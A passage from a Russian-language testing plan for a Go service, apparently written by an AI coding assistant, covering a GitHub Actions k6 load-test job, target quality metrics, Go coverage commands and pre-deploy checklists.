      - name: Install k6
        run: |
          sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv-keys C5AD17C747E3415A3642D57D77C6C491D6AC1D69
          echo "deb https://dl.k6.io/deb stable main" | sudo tee /etc/apt/sources.list.d/k6.list
          sudo apt-get update
          sudo apt-get install k6

      - name: Run load tests
        run: |
          cd tests/load
          k6 run --out json=results.json load_test.js

      - name: Upload results
        uses: actions/upload-artifact@v3
        with:
          name: load-test-results
          path: tests/load/results.json
```

---

## 📊 МЕТРИКИ КАЧЕСТВА

### Целевые метрики:

| Метрика | Целевое значение | Текущее | Статус |
|---------|-----------------|---------|--------|
| **Code Coverage** | ≥ 80% | TBD | 🟡 |
| **Unit Tests** | ≥ 70% покрытия | TBD | 🟡 |
| **Integration Tests** | Все критичные flows | TBD | 🟡 |
| **E2E Tests** | 5+ сценариев | TBD | 🟡 |
| **Load Test** | 200 RPS, p95 < 1s | TBD | 🟡 |
| **Security Tests** | 0 vulnerabilities | TBD | 🟡 |
| **Bug Detection Rate** | < 1% после deploy | TBD | 🟡 |

### Отчетность:

```bash
# Генерация coverage отчета
go test -coverprofile=coverage.out ./...
go tool cover -html=coverage.out -o coverage.html

# Анализ покрытия
go tool cover -func=coverage.out | grep total

# Генерация отчета по тестам
go test -json ./... | tee test-report.json
```

---

## 🎯 ЧЕКЛИСТ ДЛЯ ЗАПУСКА ТЕСТОВ

### Перед каждым коммитом:
- [ ] Запустить unit тесты: `go test ./...`
- [ ] Проверить coverage: `go test -cover ./...`
- [ ] Запустить линтер: `golangci-lint run`
- [ ] Проверить race conditions: `go test -race ./...`

### Перед PR:
- [ ] Все unit тесты проходят (100%)
- [ ] Integration тесты проходят
- [ ] Coverage ≥ 80%
- [ ] Нет race conditions
- [ ] Lint чистый (0 warnings)
- [ ] Benchmark не деградировал (< 10% regression)

### Перед deploy на staging:
- [ ] Все тесты (unit + integration + E2E) проходят
- [ ] Load тесты показывают acceptable performance
- [ ] Security тесты проходят
- [ ] Smoke tests на staging environment

### Перед deploy на production:
- [ ] Все тесты staging environment прошли
- [ ] Load тесты с production-like data
- [ ] Rollback план протестирован
- [ ] Monitoring и alerting настроены

---

## 📝 ЗАКЛЮЧЕНИЕ

Этот план тестирования обеспечивает:

✅ **Полное покрытие функциональности** (unit + integration + E2E)
✅ **Производительность под нагрузкой** (load тесты с k6)
✅ **Безопасность** (auth, rate limiting, injection protection)
✅ **Надежность** (graceful degradation, error handling)
✅ **CI/CD интеграция** (автоматический запуск на каждый commit)

**Следующие шаги:**
1. Реализовать все unit тесты согласно плану
2. Настроить integration тесты с Testcontainers
3. Создать E2E тесты для критичных flows
4. Интегрировать в CI/CD pipeline (GitHub Actions)
5. Настроить мониторинг coverage и performance

---

**Автор**: Claude Code
**Дата**: 2025-10-23
**Версия документа**: 1.0
